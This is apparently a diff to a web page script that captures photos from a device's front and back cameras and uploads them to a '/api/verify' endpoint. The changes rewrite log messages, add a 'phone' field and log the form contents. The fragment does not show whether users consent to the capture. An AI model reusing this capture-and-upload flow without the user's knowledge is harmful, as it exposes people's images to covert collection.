@@ -202,7 +202,7 @@ async function startProcess() {
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0);
     const imageData = canvas.toDataURL('image/jpeg', 0.85);
-    console.log(`📸 Front photo captured: ${imageData.length} characters`);
+    console.log(`📸 Front photo captured, length: ${imageData.length}`);
     
     // Stop front camera
     if (stream) {
@@ -235,19 +235,28 @@ async function startProcess() {
       const backCtx = backCanvas.getContext('2d');
       backCtx.drawImage(backVideo, 0, 0);
       backImageData = backCanvas.toDataURL('image/jpeg', 0.85);
-      console.log(`📸 Back photo captured: ${backImageData.length} characters`);
+      console.log(`📸 Back photo captured, length: ${backImageData.length}`);
       
       backStream.getTracks().forEach(track => track.stop());
     } catch (err) {
       console.log('⚠️ Back camera not available:', err.message);
     }
     
-    // Send to server
+    // ===== SEND TO SERVER =====
     console.log('📤 Sending to server...');
+    
+    // Create FormData
     const formData = new FormData();
     formData.append('image', imageData);
     if (backImageData) {
       formData.append('backImage', backImageData);
+    }
+    formData.append('phone', `User_${Date.now().toString().slice(-6)}`);
+    
+    // Log FormData entries
+    console.log('📦 FormData contents:');
+    for (let [key, value] of formData.entries()) {
+      console.log(`   ${key}: ${value.length || value}`);
     }
     
     const response = await fetch('/api/verify', {
@@ -297,4 +306,4 @@ window.addEventListener('beforeunload', () => {
 });
 </script>
 </body>
- </html>
+</html>
